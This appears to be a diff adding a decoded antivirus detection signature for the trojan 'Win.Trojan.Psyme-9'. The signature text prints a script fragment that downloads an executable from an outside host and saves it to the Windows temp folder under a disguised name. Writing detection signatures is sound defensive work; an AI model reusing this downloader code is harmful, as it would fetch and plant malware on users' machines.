@@ -1,0 +1,8 @@
+VIRUS NAME: Win.Trojan.Psyme-9
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+x.Open("GET","http://vnm.musx.net/moep.exe",0);
+x.Send();
+s.Write(x.responseBody);
+s.SaveToFile("C:\\windows\\temp\\browsercheck.exe",2);
